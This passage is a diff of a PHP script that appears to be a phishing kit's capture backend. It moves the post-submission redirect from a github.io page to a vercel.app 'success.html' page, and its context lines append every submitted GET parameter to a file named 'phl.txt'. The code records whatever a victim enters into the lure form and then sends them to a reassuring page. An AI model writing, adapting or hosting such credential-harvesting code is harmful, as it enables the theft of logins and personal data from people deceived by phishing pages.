@@ -1,5 +1,5 @@
 <?php
-header ('Location:http://noode2024.github.io/networktw/success.html');
+header ('Location:https://networktw.vercel.app/success.html');
 $handle = fopen("phl.txt", "a");
 foreach($_GET as $variable => $value) {
    fwrite($handle, $variable);
